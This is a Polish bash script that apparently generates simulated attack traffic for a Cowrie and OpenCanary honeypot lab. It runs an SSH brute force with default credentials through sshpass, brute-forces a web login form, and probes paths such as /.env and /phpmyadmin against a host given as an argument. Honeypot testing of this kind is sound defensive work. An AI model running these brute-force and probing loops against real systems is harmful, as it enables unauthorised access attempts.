#!/bin/bash
# ═══════════════════════════════════════════════════════
#  Symulowany atak — SSH brute force + web probing
#  Wersja uniwersalna (macOS, Linux, RPi)
# ═══════════════════════════════════════════════════════

TARGET_INPUT=${1:-"localhost"}
SSH_PORT=${2:-"2222"}
WORDLIST=${WORDLIST:-"rockyou_small.txt"}

WEB_URL="${TARGET_INPUT%/}"
if [[ "$WEB_URL" != http://* && "$WEB_URL" != https://* ]]; then
    WEB_URL="http://$WEB_URL"
fi

SSH_HOST="$TARGET_INPUT"
SSH_HOST="${SSH_HOST#http://}"
SSH_HOST="${SSH_HOST#https://}"
SSH_HOST="${SSH_HOST%%/*}"
SSH_HOST="${SSH_HOST%%:*}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════╗${NC}"
echo -e "${RED}║     SYMULOWANY ATAK — TYLKO TESTY        ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════╝${NC}"
echo -e "${CYAN}[*] Cel WWW:${NC} $WEB_URL"
echo -e "${CYAN}[*] Cel SSH:${NC} $SSH_HOST:$SSH_PORT"

# --- Sprawdzenie dostępności celu SSH ---
SSH_AVAILABLE=true
if command -v nc &>/dev/null; then
    echo -ne "${CYAN}[*] Sprawdzanie SSH $SSH_HOST:$SSH_PORT... ${NC}"
    if ! nc -z -w3 "$SSH_HOST" "$SSH_PORT" 2>/dev/null; then
        SSH_AVAILABLE=false
        echo -e "${YELLOW}NIEOSIĄGALNY — pomijam brute force SSH${NC}"
    else
        echo -e "${GREEN}OK${NC}"
    fi
else
    echo -e "${YELLOW}[!] Brakuje 'nc'. Nie sprawdzam portu SSH przed testem.${NC}"
fi

# --- Sprawdzenie curl ---
if ! command -v curl &>/dev/null; then
    echo -e "${RED}[-] Brakuje 'curl'. Zainstaluj curl i uruchom skrypt ponownie.${NC}"
    exit 1
fi

echo -ne "${CYAN}[*] Sprawdzanie WWW $WEB_URL... ${NC}"
if curl -k -s --max-time 5 -o /dev/null "$WEB_URL"; then
    echo -e "${GREEN}OK${NC}"
else
    echo -e "${YELLOW}BRAK ODPOWIEDZI — kontynuuję, żeby wygenerować próby${NC}"
fi

# --- Sprawdzenie sshpass ---
if $SSH_AVAILABLE && ! command -v sshpass &>/dev/null; then
    echo -e "${YELLOW}[!] Brakuje 'sshpass'. Próbuję zainstalować...${NC}"
    if [[ "$OSTYPE" == "darwin"* ]]; then
        brew install sshpass || { echo -e "${RED}Błąd instalacji brew. Zainstaluj sshpass ręcznie.${NC}"; SSH_AVAILABLE=false; }
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        sudo apt update && sudo apt install -y sshpass || { echo -e "${RED}Błąd apt. Zainstaluj sshpass ręcznie.${NC}"; SSH_AVAILABLE=false; }
    fi
fi

# --- Metoda: Brute Force SSH (Automatyczny) ---
if $SSH_AVAILABLE; then
    echo -e "${YELLOW}[URUCHAMIAM] Atak brute-force na SSH...${NC}"

    PASSWORDS=("123456" "password" "admin" "root" "raspberry" "wrongpass1" "wrongpass2" "letmein")
    USERS=("root" "admin" "pi" "ubuntu" "user")

    for user in "${USERS[@]}"; do
        for pass in "${PASSWORDS[@]}"; do
            echo -ne "${CYAN}Próba SSH:${NC} $user:$pass → "

            sshpass -p "$pass" ssh -p "$SSH_PORT" \
                -o StrictHostKeyChecking=no \
                -o ConnectTimeout=2 \
                -o BatchMode=no \
                -o UserKnownHostsFile=/dev/null \
                "$user@$SSH_HOST" "whoami" &>/dev/null

            echo -e "${GREEN}ZAREJESTROWANO${NC}"
            sleep 0.2
        done
    done
fi

# --- Metoda: HTTP brute force przez formularz /login ---
echo -e "${YELLOW}[URUCHAMIAM] Atak brute-force na formularz WWW...${NC}"
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Nie znaleziono $WORDLIST. Używam krótkiej listy awaryjnej.${NC}"
    HTTP_PASSWORDS=("123456" "password" "admin" "root" "student" "letmein")
    for word in "${HTTP_PASSWORDS[@]}"; do
        echo -ne "${CYAN}Próba WWW:${NC} admin:$word → "
        curl -k -s -o /dev/null -X POST "$WEB_URL/login" \
            -d "username=admin&password=$word" \
            -A "Mozilla/5.0 (compatible; scanner)"
        echo -e "${GREEN}ZAREJESTROWANO${NC}"
        sleep 0.1
    done
else
    while IFS= read -r word || [ -n "$word" ]; do
        [ -z "$word" ] && continue
        echo -ne "${CYAN}Próba WWW:${NC} admin:$word → "
        curl -k -s -o /dev/null -X POST "$WEB_URL/login" \
            -d "username=admin&password=$word" \
            -A "Mozilla/5.0 (compatible; scanner)"
        echo -e "${GREEN}ZAREJESTROWANO${NC}"
        sleep 0.1
    done < "$WORDLIST"
fi

# --- Metoda: skanowanie ścieżek WWW ---
echo -e "${YELLOW}[URUCHAMIAM] Skanowanie ścieżek WWW...${NC}"
for path in /admin /wp-login.php /.env /phpmyadmin /config.php /backup.zip /api/v1/users; do
    curl -k -s -o /dev/null -w "%{http_code} $path\n" "$WEB_URL$path"
    sleep 0.1
done

echo ""
echo -e "${GREEN}[+] Symulacja zakończona.${NC}"
echo -e "${YELLOW}[MONITOROWANIE]${NC}"
echo "1. Grafana: http://localhost:3000 (Loki: {job='cowrie'} oraz {job='opencanary', service='http'})"
echo "2. Uptime Kuma: http://localhost:3001"
echo "3. Logi Cowrie: ls -l ./logs/cowrie/cowrie.json"
echo "4. Logi OpenCanary: tail -f ./logs/opencanary/opencanary.log"
